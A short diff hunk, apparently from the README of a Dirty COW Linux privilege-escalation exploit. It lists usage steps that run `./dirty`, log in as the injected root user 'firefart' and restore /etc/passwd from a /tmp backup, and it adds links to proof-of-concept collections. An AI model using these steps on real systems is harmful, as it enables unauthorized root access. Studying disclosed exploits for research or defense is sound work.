@@ -12,3 +12,8 @@
 2. `./dirty` or `./dirty my-new-password`
 3. `su firefart` or `ssh firefart@...`
 4. `mv /tmp/passwd.bak /etc/passwd`
+
+
+### Others
++ https://dirtycow.ninja/
++ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
